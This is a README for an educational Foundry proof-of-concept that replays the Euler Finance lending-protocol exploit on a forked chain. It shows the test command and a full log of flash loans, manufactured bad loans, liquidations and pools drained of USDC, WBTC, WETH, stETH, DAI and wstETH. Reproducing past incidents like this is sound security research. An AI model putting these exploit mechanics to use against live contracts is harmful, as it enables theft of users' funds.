# Euler Exploit PoC

This is an educational proof-of-concept for the [vulnerability in a Euler contract](https://medium.com/@omniscia.io/euler-finance-incident-post-mortem-1ce077c28454). The exploit closely replicates reverse engineered contract [0x036cec1a199234fc02f72d29e596a09440825f1c](https://etherscan.io/address/0x036cec1a199234fc02f72d29e596a09440825f1c).

Proudly using Immunefi's [Forge PoC Templates](https://github.com/immunefi-team/forge-poc-templates)

## Requirements

- [Foundry](https://book.getfoundry.sh)

## Run

Run test as follows:

```
% forge test --match-path test/pocs/EulerHack.t.sol -vvv
[⠆] Compiling...
[⠊] Compiling 52 files with 0.8.17
[⠰] Solc 0.8.17 finished in 4.87s
Compiler run successful (with warnings)

Running 1 test for test/pocs/EulerHack.t.sol:EulerHackTest
[PASS] testFlashLoan() (gas: 17687653)
Logs:
  [*] Forking chain before the attack at 16817995
  

  [*] Attacking USDC...
  [*] Euler balance before exploit: 34413863 USDC
  [*] Borrowing 210000000 USDC
  >>> Taking flashloan of 210000000000000 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 from FlashLoanProviders[2]
  >>> Execute attack
  [*] Generated bad loan...
      Collateral: 2158641630 Debt: 2730000000
  [*] Liquidated bad loan...
      Collateral: 2158641630 Debt: 1811583362 Profit: 347058268
  [*] Stealing 34413863 USDC from Euler pool
  >>> Attack completed successfully
  >>> Pay back flash loan
  [*] Attacker balance after exploit: 34224863 USDC
  

  [*] Attacking WBTC...
  [*] Euler balance before exploit: 849 WBTC
  [*] Borrowing 3000 WBTC
  >>> Taking flashloan of 300000000000 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599 from FlashLoanProviders[2]
  >>> Execute attack
  [*] Generated bad loan...
      Collateral: 31483 Debt: 39000
  [*] Liquidated bad loan...
      Collateral: 31483 Debt: 26010 Profit: 5473
  [*] Stealing 849 WBTC from Euler pool
  >>> Attack completed successfully
  >>> Pay back flash loan
  [*] Attacker balance after exploit: 846 WBTC
  

  [*] Attacking WETH...
  [*] Euler balance before exploit: 8099 WETH
  [*] Borrowing 20895 WETH
  >>> Taking flashloan of 20895000000000000000000 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 from FlashLoanProviders[2]
  >>> Execute attack
  [*] Generated bad loan...
      Collateral: 215261 Debt: 271635
  [*] Liquidated bad loan...
      Collateral: 215261 Debt: 180350 Profit: 34911
  [*] Stealing 8099 WETH from Euler pool
  >>> Attack completed successfully
  >>> Pay back flash loan
  [*] Attacker balance after exploit: 8080 WETH
  

  [*] Attacking stETH...
  [*] Euler balance before exploit: 3897 stETH
  [*] Borrowing 20895 stETH
  >>> Taking flashloan of 20895000000000000000000 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84 from FlashLoanProviders[2]
  >>> Execute attack
  [*] Generated bad loan...
      Collateral: 212549 Debt: 271635
  [*] Liquidated bad loan...
      Collateral: 212549 Debt: 179789 Profit: 32760
  [*] Stealing 3897 stETH from Euler pool
  >>> Attack completed successfully
  >>> Pay back flash loan
  [*] Attacker balance after exploit: 3878 stETH
  

  [*] Attacking DAI...
  [*] Euler balance before exploit: 8904507 DAI
  [*] Borrowing 30000000 DAI
  >>> Taking flashloan of 30000000000000000000000000 0x6B175474E89094C44Da98b954EedeAC495271d0F from FlashLoanProviders[2]
  >>> Execute attack
  [*] Generated bad loan...
      Collateral: 310930612 Debt: 390000000
  [*] Liquidated bad loan...
      Collateral: 310930612 Debt: 259319058 Profit: 51611554
  [*] Stealing 8904507 DAI from Euler pool
  >>> Attack completed successfully
  >>> Pay back flash loan
  [*] Attacker balance after exploit: 8877507 DAI
  

  [*] Attacking wstETH...
  [*] Euler balance before exploit: 66271 wstETH
  [*] Borrowing 99000 wstETH
  >>> Taking flashloan of 99000000000000000000000 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0 from FlashLoanProviders[4]
  >>> Execute attack
  [*] Generated bad loan...
      Collateral: 1040313 Debt: 1287000
  [*] Liquidated bad loan...
      Collateral: 1040313 Debt: 858613 Profit: 181700
  [*] Stealing 46200 wstETH from Euler pool
  >>> Attack completed successfully
  >>> Pay back flash loan
  [*] Borrowing 99000 wstETH
  >>> Taking flashloan of 99000000000000000000000 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0 from FlashLoanProviders[4]
  >>> Execute attack
  [*] Generated bad loan...
      Collateral: 1040313 Debt: 1287000
  [*] Liquidated bad loan...
      Collateral: 1040313 Debt: 858613 Profit: 181700
  [*] Stealing 20071 wstETH from Euler pool
  >>> Attack completed successfully
  >>> Pay back flash loan
  [*] Attacker balance after exploit: 66271 wstETH

Test result: ok. 1 passed; 0 failed; finished in 332.89ms
```
